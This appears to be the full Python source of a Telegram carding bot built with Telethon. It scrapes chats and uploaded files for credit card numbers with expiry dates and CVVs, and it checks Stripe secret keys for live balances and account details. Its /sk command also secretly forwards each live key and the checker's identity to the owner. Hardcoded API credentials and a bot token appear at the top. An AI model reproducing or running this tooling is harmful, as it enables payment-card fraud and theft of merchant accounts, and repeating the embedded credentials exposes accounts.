import re
import logging
import time
import stripe
from telethon import TelegramClient, events, functions, types
from telethon.tl.custom import Button

# Replace these with your own values
api_id = '26404724'
api_hash = 'c173ec37cd2a6190394a0ec7915e7d50'
bot_token = '7335162364:AAET0EAnZtIY61QEFcvH4XlE8JTEPMaubH0'
owner_id = 6008343239  # Owner's Telegram ID

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

client = TelegramClient('session_ame', api_id, api_hash)
acc = TelegramClient('acc_ame', api_id, api_hash)

# In-memory set to track seen credit card entries
seen_ccs = set()

# Set to track forbidden words/patterns
forbidden_words = {"badword1", "badword2"}  # Replace with actual words

# Function to extract credit card details
def extract_cc(text):
    regex = r'\b(\d{15,16})[/| -]+(\d{1,2})[/| -]+(\d{2,4})[/| -]+(\d{3,4})\b'
    matches = re.findall(regex, text)
    if not matches:
        return []

    formatted_cc = []
    for match in matches:
        cc_number, month, year, cvv = match
        formatted_month = month.zfill(2)
        formatted_year = '20' + year if len(year) == 2 else year
        cc_entry = f"{cc_number}|{formatted_month}|{formatted_year}|{cvv}"
        
        # Check for duplicates
        if cc_entry not in seen_ccs:
            formatted_cc.append(cc_entry)
            seen_ccs.add(cc_entry)

    return formatted_cc

@client.on(events.NewMessage(pattern='/start'))
async def welcome(event):
    welcome_message = (
        "Welcome to the Free CC Logs Extractor Bot! 🎉\n"
        "Here are the commands you can use:\n\n"
        "/scrape <chat_name> <amount> - Scrape CC details from a chat\n"
        "/flt - Extract CC details from a text file (reply to the file with this command)\n"
        "/id - Show your user ID and chat ID\n"
        "/sk <sk_key> - Check Stripe SK key details\n"
        "Developer: [OM](https://t.me/rundilundlegamera)"
    )
    await event.reply(welcome_message)

@client.on(events.NewMessage(pattern='/scrape (.*) (\d+)'))
async def handler(event):
    start_time = time.time()
    found_ccs = 0
    msgg = await event.reply("Please wait...")
    chat_name = event.pattern_match.group(1)
    amount = int(event.pattern_match.group(2))

    try:
        chat = await acc.get_input_entity(chat_name)

        async for message in acc.iter_messages(chat):
            text = message.text
            if text:
                # Filter forbidden words/patterns
                if any(word in text for word in forbidden_words):
                    continue
                
                extracted_ccs = extract_cc(text)
                if extracted_ccs:
                    with open("combos/scrapped.txt", "a") as file:
                        for cc in extracted_ccs:
                            file.write(f"{cc}\n")
                    found_ccs += len(extracted_ccs)
                    if found_ccs >= amount:
                        break

        with open("combos/scrapped.txt", "r") as file:
            lines = file.readlines()
            count = len(lines)

        end_time = time.time()
        time_taken = end_time - start_time

        await client.send_file(
            event.chat_id,
            "combos/scrapped.txt",
            caption=f'CCs Found: `{count}`\nTime Taken: `{time_taken:.2f}s`',
            buttons=[[
                Button.url("Owner", "https://t.me/rundilundlegamera")
            ]]
        )
        await msgg.delete()
        with open("combos/scrapped.txt", "w") as file:
            file.write("")
    except Exception as e:
        logger.error(f"Error during scraping: {e}")
        await event.reply("An error occurred during scraping. Please try again later.")

@client.on(events.NewMessage(pattern='/flt'))
async def extract_cc_command(event):
    user_id = event.sender_id
    if event.is_reply and event.message.reply_to_msg_id:
        message = await event.get_reply_message()
        if message.file:
            try:
                start_time = time.time()
                msgg = await event.reply("Please wait...")
                file = await message.download_media(f'combos/fil_{user_id}.txt')
                
                with open(file, "r") as fie:
                    lines = fie.readlines()
                    with open(f"combos/results_{user_id}.txt", "w") as res:
                        found_ccs = 0
                        for line in lines:
                            credit_cards = extract_cc(line)
                            if credit_cards:
                                formatted_cc = credit_cards[0]
                                res.write(f"{formatted_cc}\n")
                                found_ccs += 1

                end_time = time.time()
                time_taken = end_time - start_time

                await msgg.delete()
                await client.send_file(
                    event.chat_id,
                    f"combos/results_{user_id}.txt",
                    caption=f'CCs Found: `{found_ccs}`\nTime Taken: `{time_taken:.2f}s`',
                    buttons=[[
                        Button.url("Owner", "https://t.me/rundilundlegamera")
                    ]]
                )
            except Exception as e:
                logger.error(f"Error processing file: {e}")
                await event.reply("There was an error processing the file.")
        else:
            await event.reply('No file found. Please reply to a text file.')
    else:
        await event.reply('Please reply to a file.')

@client.on(events.NewMessage(pattern='/id'))
async def id_command(event):
    user_id = event.sender_id
    chat_id = event.chat_id
    await event.reply(f'Your User ID: `{user_id}`\nYour Chat ID: `{chat_id}`')

# Command to check Stripe keys with details sent to the owner
@client.on(events.NewMessage(pattern='/sk (.+)'))
async def check_sk_command(event):
    sk_key = event.pattern_match.group(1)
    
    stripe.api_key = sk_key

    start_time = time.time()
    integration_status = "ON"
    rate_limit_status = "No issues"

    try:
        account = stripe.Account.retrieve()
        balance = stripe.Balance.retrieve()
        available_balance = sum([amt['amount'] for amt in balance['available']]) / 100
        pending_balance = sum([amt['amount'] for amt in balance['pending']]) / 100

        response_time = round(time.time() - start_time, 2)
        
        owner_message = f"""
        A LIVE Stripe Key was checked:
        
        SK ➺ `{sk_key}`
        CURRENCY: {account.default_currency}
        BALANCE: {available_balance}
        PENDING AMOUNT: {pending_balance}
        ACC_ID: {account.id}
        BUSINESS NAME: {account.business_profile.name}
        SITE URL: {account.business_profile.url}
        EMAIL: {account.email}
        COUNTRY: {account.country}
        Time Took: {response_time} Seconds
        Checked By ➺ [{event.sender.first_name}](tg://user?id={event.sender_id})
        """
        await client.send_message(owner_id, owner_message, parse_mode="Markdown")
        
        user_response = f"""𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅

SK ➺ 
<code>{sk_key}</code>

Response : 𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅
CURRENCY: {account.default_currency}
BALANCE: {available_balance}
PENDING AMOUNT: {pending_balance}
ACC_ID: {account.id}
BUSINESS NAME: {account.business_profile.name}
SITE URL: {account.business_profile.url}
EMAIL: {account.email}
COUNTRY: {account.country}
Time Took: {response_time} Seconds

Integration Status: {integration_status}
Rate Limit Status: {rate_limit_status}

Checked By ➺ <a href="tg://user?id={event.sender_id}">{event.sender.first_name}</a>
Bot Made By ➺ <a href="https://t.me/rundilundlegamera">⏤͟͞𝙊𝗠 「𝗫𝗬」</a>
"""
        await event.reply(user_response, parse_mode="HTML")
    except stripe.error.RateLimitError:
        rate_limit_status = "Rate limit exceeded"
        await event.reply(f"Error: {rate_limit_status}")
    except stripe.error.AuthenticationError:
        await event.reply("SK is invalid or expired.")
    except stripe.error.APIConnectionError:
        integration_status = "OFF"
        await event.reply("Error: API connection issue. Integration Status: OFF")
    except Exception as e:
        logger.error(f"Error during SK check: {e}")
        await event.reply("An error occurred while checking the SK key. Please try again later.")

async def main():
    await acc.start()
    await client.start(bot_token=bot_token)
    await client.run_until_disconnected()

if __name__ == '__main__':
    client.loop.run_until_complete(main())
